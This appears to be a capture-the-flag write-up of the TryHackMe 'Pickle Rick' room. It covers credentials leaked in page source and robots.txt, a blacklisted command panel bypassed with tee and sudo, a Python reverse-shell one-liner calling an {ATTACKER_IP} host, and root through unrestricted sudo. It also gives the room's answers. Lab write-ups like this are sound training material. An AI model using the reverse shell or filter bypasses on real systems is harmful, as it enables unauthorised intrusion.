@@ -1,0 +1,317 @@
+---
+title: 'Pickle Rick'
+description: 'Credentials exposed in source and robots.txt, a command panel with a bypassable blacklist and privilege escalation with sudo.'
+publishDate: 2026-09-04
+tags:
+  - cybersecurity
+  - tryhackme
+  - web
+  - privesc
+---
+
+**Difficulty:** Easy **Category:** Web enumeration, credentials exposed in source/`robots.txt`, command panel with a bypassable blacklist, reverse shell, trivial privilege escalation via unrestricted `sudo -l` **Room:** [https://tryhackme.com/room/picklerick](https://tryhackme.com/room/picklerick)
+
+> **Note on the name:** the room is officially called **“Pickle Rick”** (a direct reference to the _Rick and Morty_ episode where Rick turns into a pickle); the original English name is kept in the title since that is how it is registered on TryHackMe.
+
+## Room description
+
+> “Rick needs your help to turn himself back into a human from his pickle form. Help him find the 3 secret ingredients he needs for his potion!”
+
+An introductory-difficulty Linux machine, _Rick and Morty_-themed, centred on a classic web-recon flow: credentials leaked in the source code and in `robots.txt`, access to a **command panel** with a (easily bypassable) blacklist of blocked commands, obtaining a reverse shell, and a trivial privilege escalation thanks to a `sudo` permission with no restriction whatsoever.
+
+> **Note on placeholders:** `{IP}` stands for the IP TryHackMe assigns (it changes on every deploy; these notes use `TARGET_IP` as an example from one specific session). `{ATTACKER_IP}` stands for the attacker’s own IP or that of the TryHackMe VPN’s `tun0` interface, needed for the reverse shell.
+
+---
+
+## 1. Environment setup
+
+```bash
+mkdir -p pickle_rick/{scans,content,scripts,loot,exploits} && cd pickle_rick
+```
+
+---
+
+## 2. Recon (nmap, a prior step not explicitly in these notes)
+
+```bash
+nmap -sV -sC -p- {IP} -oN nmap_full.txt
+```
+
+**Expected ports:**
+
+| Port   | Service                                                         |
+| ------ | --------------------------------------------------------------- |
+| 22/tcp | SSH (no known credentials at the start, not the initial vector) |
+| 80/tcp | HTTP (Apache)                                                   |
+
+Since no SSH credentials are available at the start, port 22 is ruled out as a direct entry vector, and all the investigation focuses on port 80.
+
+---
+
+## 3. Getting the username
+
+Visiting `http://{IP}/`, a themed page loads with an image and intro text to the story. Reviewing the page’s **HTML source** (`Ctrl+U` in the browser, or `curl -s http://{IP}/`):
+
+```bash
+curl -s http://{IP}/ | grep -i -A2 -B2 "username\|user"
+```
+
+An HTML comment is found with the username:
+
+```
+Username: R1ckRul3s
+```
+
+---
+
+## 4. Getting the password (`robots.txt`)
+
+```bash
+curl -s http://{IP}/robots.txt
+```
+
+`robots.txt` (the standard file aimed at search engines) contains, in this case, a string that actually works as the password for the just-discovered user:
+
+```
+Wubbalubbadubdub
+```
+
+> Note: this is character Rick’s catchphrase in the show (“Wubba lubba dub dub”), consistent with the room’s theme.
+
+---
+
+## 5. Further enumeration with Gobuster (recommended, complements these notes)
+
+```bash
+gobuster dir -u http://{IP}/ -w /usr/share/wordlists/dirb/common.txt -t 100 2>/dev/null
+```
+
+**Relevant results:**
+
+```
+/login.php     (Status: 200)
+/portal.php    (Status: 302)  --> redirects to denied.php if not logged in
+/robots.txt    (Status: 200)
+/assets/       (Status: 301)
+/denied.php    (Status: 200)
+```
+
+The `/portal.php` file is especially relevant: any attempt to access it **without logging in first** automatically redirects to `denied.php` — indicating it is a page protected by authentication, which will be accessed once logged in in the next step.
+
+---
+
+## 6. Logging in
+
+```
+http://{IP}/login.php
+```
+
+```
+Username: R1ckRul3s
+Password: Wubbalubbadubdub
+```
+
+On authenticating successfully, you get access to **Rick’s Portal**, which now does allow navigating to `/portal.php`.
+
+---
+
+## 7. First ingredient
+
+Even before exploring the command panel, the file’s own name can be guessed or discovered by additional fuzzing in the root directory:
+
+```bash
+curl http://{IP}/Sup3rS3cretPickl3Ingred.txt
+```
+
+Or by visiting it directly in the browser:
+
+```
+http://{IP}/Sup3rS3cretPickl3Ingred.txt
+```
+
+**First ingredient obtained** (the file’s content, e.g. `mr. meeseeks hair`).
+
+---
+
+## 8. The command panel (`portal.php`)
+
+Inside `portal.php`, there is a **“Command Panel”**: a text field that lets you type and run Linux commands directly on the server — in practice, an **official webshell** intentionally provided by the application itself as the challenge’s central mechanic.
+
+### 8.1 Blacklist of blocked commands
+
+Trying to read files with obvious commands like `cat`, the panel responds with an error saying the command is not allowed. Inspecting `portal.php`'s source (accessible, for example, by requesting it with `tee` or reviewing the page’s HTML/JS, depending on the access level) confirms the existence of a **blacklist** of explicitly blocked commands:
+
+```php
+$cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
+```
+
+This explains why **`cat file.txt` is not enough** to read content — you have to use alternative commands not in that list, or bypass it directly.
+
+### 8.2 Confirming which tools are available on the server
+
+Before attempting a reverse shell, it is worth confirming which interpreters/tools are available on the target system (a step present in these notes):
+
+```
+which python3 python nc curl wget
+```
+
+This is typed directly into the command panel field (since, as explained, it is a functional webshell) and confirms which options are available to launch the reverse shell (here, `python3` is present).
+
+### 8.3 Alternative commands to read files without using `cat`
+
+Although the final goal is to obtain a full shell, it is worth mentioning (documented in several public write-ups) that the blacklist can be bypassed trivially without even needing a reverse shell, using equivalent non-blocked commands:
+
+```
+ls -la
+less file.txt
+tee < file.txt
+sudo cat file.txt      # prepending sudo bypasses the filter's literal comparison
+```
+
+- `tee < file.txt`: uses `tee` in read mode (input redirection) to show a file’s content, a classic restricted-shell bypass trick.
+- Prepending `sudo` to a blocked command (`sudo cat ...`) also bypasses the filter in many naive implementations, since the blacklist comparison is usually done against the exact name of the command’s first token.
+
+---
+
+## 9. Getting a reverse shell
+
+### 9.1 Prepare the listener
+
+```bash
+nc -lvnp 9001
+```
+
+### 9.2 Reverse-shell payload (Python3)
+
+Typed directly into the **Command Panel** text field of `portal.php`:
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+
+Breakdown:
+
+- `socket.socket(...)` + `s.connect((...))`: creates a TCP socket and connects to the attacker machine.
+- `os.dup2(s.fileno(), 0/1/2)`: redirects standard input, standard output and error output to the socket.
+- `import pty; pty.spawn("sh")`: launches an `sh` shell with a pseudo-terminal, already with input/output redirected — the Python equivalent of a traditional Bash reverse shell.
+
+When the command is sent from the web panel, the server runs it and the listener receives the connection:
+
+```bash
+whoami
+# www-data
+```
+
+### 9.3 Stabilise the shell
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+(Optionally followed by `Ctrl+Z`, `stty raw -echo; fg`, and `export TERM=xterm`, as on previous machines.)
+
+---
+
+## 10. Second ingredient
+
+With a full shell now (free of the web panel’s restrictions), you can use `cat` normally:
+
+```bash
+ls /home
+cat /home/rick/'second ingredients'
+```
+
+- The single quotes around `second ingredients` are needed because the filename contains a **space**, and without them the shell would interpret `second` and `ingredients` as two separate arguments instead of a single filename.
+
+**Result:**
+
+```
+1 jerry tear
+```
+
+> Note: in some variants of the machine/session, the filesystem also includes a `clue.txt` in the reverse shell’s starting directory, with a text hint (“Look around the file system for the other ingredient”) that points toward `rick`'s home directory if it is not found immediately.
+
+---
+
+## 11. Privilege escalation and third ingredient
+
+### 11.1 Enumerating sudo permissions
+
+```bash
+sudo -l
+```
+
+Expected output:
+
+```
+Matching Defaults entries for www-data on pickle-rick:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User www-data may run the following commands on pickle-rick:
+    (ALL) NOPASSWD: ALL
+```
+
+The line **`(ALL) NOPASSWD: ALL`** is the most direct privilege escalation possible: the current user (`www-data`, the web server’s own process) can run **absolutely any command, as any user (root included), without needing a password**. This requires no special GTFOBins technique nor any specific binary — it is, in practice, direct root access.
+
+### 11.2 Exploitation
+
+```bash
+sudo su
+```
+
+Or, equivalently and more directly:
+
+```bash
+sudo bash
+```
+
+```bash
+id
+# uid=0(root) gid=0(root)
+```
+
+### 11.3 Third ingredient
+
+```bash
+cat /root/3rd.txt
+```
+
+**Result:**
+
+```
+fleeb juice
+```
+
+With the three ingredients obtained (`mr. meeseeks hair`, `1 jerry tear`, `fleeb juice`), the room’s narrative objective is complete.
+
+---
+
+## 12. Attack chain summary
+
+1. **Recon** with `nmap` → SSH (22, ruled out as a vector) and HTTP (80).
+2. **Main page source** → reveals user `R1ckRul3s`.
+3. **`robots.txt`** → reveals password `Wubbalubbadubdub`.
+4. **Web fuzzing** with `gobuster` → confirms `login.php`, `portal.php` (protected), `denied.php`.
+5. **Successful login** → access to `portal.php`, a command panel (the app’s official webshell) with a blacklist of blocked commands (`cat`, `head`, `tail`, etc.).
+6. **First ingredient**: `Sup3rS3cretPickl3Ingred.txt`, directly accessible by URL.
+7. **Reverse shell** (Python3) injected through the Command Panel itself → shell as `www-data`, free of blacklist restrictions.
+8. **Second ingredient**: `/home/rick/'second ingredients'`.
+9. **Privilege escalation**: `sudo -l` reveals `(ALL) NOPASSWD: ALL` → `sudo su` → direct root, with no additional technique needed.
+10. **Third ingredient**: `/root/3rd.txt`.
+
+## 13. Lessons learned / key concepts
+
+- **The HTML source and `robots.txt` are among the first places to check** in any web recon: forgotten development comments and “search-engine exclusion” files leak credentials with surprising frequency, even in applications that appear somewhat serious.
+- **“Command execution” panels with blocked-word blacklists are a weak defence by design**: almost any blacklist based on exact command-name matching can be bypassed with equivalent alternative commands (`tee` instead of `cat`), by prepending `sudo`, using different absolute paths, aliases, or case variations — the only robust defence is a **whitelist** of what is allowed, never a blacklist of what is forbidden.
+- **An application’s “official” command panel (even if an intended challenge feature) is functionally identical to a webshell**: any business logic that allows running arbitrary OS commands, however “intended” for legitimate use, represents the same level of risk as an exploited RCE vulnerability.
+- **`sudo -l` remains, on the vast majority of introductory-level machines, the first and most important command to run after obtaining any shell** — here, it immediately reveals an `(ALL) NOPASSWD: ALL` configuration that needs no further GTFOBins technique, only recognising that you already have, in practice, full control of the system.
+- **`(ALL) NOPASSWD: ALL` is the most dangerous possible `sudoers` configuration**: it amounts to the user in question (here, the web server’s own low-privilege account) having full root privileges at all times, with no friction — a misconfiguration that should never appear on a real production system.
+
+## 14. Tools used
+
+`nmap`, a browser/`curl` (source and `robots.txt` inspection), `gobuster`, the application’s own command panel (`portal.php`), `netcat`, `python3` (reverse shell and terminal stabilisation), `sudo`.
+
+---
+
+_Academic write-up, built from my own notes solving the “Pickle Rick” machine on TryHackMe, supplemented with public community write-ups to complete the initial recon, the context of the `portal.php` command panel and its blacklist of blocked commands, and the confirmation of the exact privilege-escalation vector._
